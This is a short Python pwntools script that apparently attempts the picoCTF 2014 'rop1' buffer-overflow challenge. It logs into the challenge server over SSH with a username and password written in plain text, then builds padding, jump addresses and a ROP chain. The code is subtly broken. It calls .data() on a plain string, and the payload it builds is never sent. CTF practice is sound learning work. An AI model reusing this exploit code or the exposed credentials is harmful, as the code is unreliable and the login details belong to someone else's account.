from pwn import *

chal='/home/rop1/rop1'
shell = ssh(host='shell2014.picoctf.com', user='pico61941',
        password='d215fb', port=22)
shell.download_file("/home/rop1/rop1")

#e= ELF('rop1')
padding = cyclic(cyclic_find('taaa'))
s = size(padding)
jmpbuf = p32(0x080eb060)
jmpread = p32(0x806cea8)
rop = ROP(chal)
rop.read(0,chal.data())

payload = "A"*76 + jmpread
sh = shell.run('rop1')

